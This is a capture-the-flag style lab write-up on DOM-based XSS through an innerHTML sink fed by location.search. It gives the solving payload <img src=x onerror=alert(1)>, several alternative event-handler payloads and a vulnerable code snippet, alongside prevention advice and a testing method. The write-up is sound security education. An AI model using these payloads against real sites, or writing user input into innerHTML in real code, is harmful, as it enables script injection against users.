# DOM XSS in innerHTML sink using source location.search

## Lab Overview
**Difficulty:** Apprentice  
**Vulnerability Type:** DOM-based Cross-Site Scripting (XSS)  
**Status:** ✅ Solved

---

## What is DOM XSS?

DOM-based XSS occurs when JavaScript takes data from an attacker-controllable source (like the URL) and passes it to a dangerous sink (like `innerHTML`) without proper validation or sanitization.

### Key Concepts

**Source:** Where the data comes from
- In this lab: `location.search` (the URL query string)

**Sink:** Where the data is used in a dangerous way
- In this lab: `innerHTML` (which renders HTML content)

---

## The Vulnerability

The application takes user input from the URL's search parameter and inserts it directly into the page using `innerHTML` without sanitization.

```javascript
// Vulnerable code pattern (example)
let searchQuery = new URLSearchParams(location.search).get('search');
document.getElementById('searchResult').innerHTML = searchQuery;
```

---

## Why innerHTML is Dangerous

While `innerHTML` does **NOT** execute `<script>` tags, it **WILL** execute JavaScript in:
- Event handlers (`onerror`, `onload`, `onclick`, etc.)
- JavaScript pseudo-protocol (`javascript:`)
- Other HTML elements with executable context

### What Won't Work
```html
<script>alert(1)</script>  ❌ innerHTML strips <script> tags
```

### What Will Work
```html
<img src=x onerror=alert(1)>  ✅ Event handlers execute
<svg onload=alert(1)>         ✅ Event handlers execute
<iframe src="javascript:alert(1)">  ✅ JavaScript protocol
```

---

## The Solution

### Payload Used
```html
<img src=x onerror=alert(1)>
```

### How It Works
1. The `<img>` tag is inserted into the DOM via `innerHTML`
2. Browser tries to load image from source `x` (invalid URL)
3. Loading fails, triggering the `onerror` event handler
4. The `onerror` handler executes `alert(1)`
5. Lab is solved! ✅

### URL Construction
```
https://YOUR-LAB-ID.web-security-academy.net/?search=<img src=x onerror=alert(1)>
```

URL-encoded version:
```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

---

## Alternative Payloads

```html
<!-- SVG with onload event -->
<svg onload=alert(1)>

<!-- Body tag with onload (may not work in all contexts) -->
<body onload=alert(1)>

<!-- Iframe with javascript protocol -->
<iframe src="javascript:alert(1)">

<!-- Image with onload and valid src -->
<img src="valid-image.jpg" onload=alert(1)>

<!-- Details/summary elements -->
<details open ontoggle=alert(1)>

<!-- Video tag with onerror -->
<video src=x onerror=alert(1)>

<!-- Audio tag with onerror -->
<audio src=x onerror=alert(1)>
```

---

## Prevention

### For Developers

1. **Never use innerHTML with user input**
   ```javascript
   // ❌ Dangerous
   element.innerHTML = userInput;
   
   // ✅ Safe
   element.textContent = userInput;
   ```

2. **Use secure alternatives**
   - `textContent` or `innerText` (treats everything as text)
   - DOM methods (`createElement`, `createTextNode`)
   
3. **Sanitize input** if HTML rendering is required
   ```javascript
   // Use a library like DOMPurify
   element.innerHTML = DOMPurify.sanitize(userInput);
   ```

4. **Content Security Policy (CSP)**
   - Implement strict CSP headers to prevent inline script execution

### For Security Testers

**Common sources to test:**
- `location.search` (query parameters)
- `location.hash` (URL fragments)
- `document.referrer`
- `document.cookie`
- `postMessage` data
- `localStorage`/`sessionStorage`

**Common sinks to look for:**
- `innerHTML`
- `outerHTML`
- `document.write()`
- `eval()`
- `setTimeout()`/`setInterval()` with string argument

---

## Testing Methodology

1. **Identify the source:** Where does user input come from?
   - Check URL parameters, hash, etc.

2. **Identify the sink:** Where is the data being used?
   - Search for `innerHTML`, `document.write`, etc.

3. **Test script execution:**
   - Try `<script>alert(1)</script>` first
   - If blocked, try event handlers
   - Try different HTML elements

4. **Verify execution:**
   - Look for alert popup
   - Check browser console for errors
   - Use developer tools to inspect DOM

---

## Key Takeaways

✅ `innerHTML` executes event handlers but not `<script>` tags  
✅ Event handlers like `onerror` and `onload` bypass this restriction  
✅ Always sanitize user input before rendering  
✅ Use `textContent` instead of `innerHTML` when possible  
✅ DOM XSS happens entirely in the browser (client-side)  

---

## References

- [PortSwigger: DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [OWASP: DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [MDN: innerHTML Security](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)

---

**Date Completed:** February 2, 2026  
**Payload Used:** `<img src=x onerror=alert(1)>`
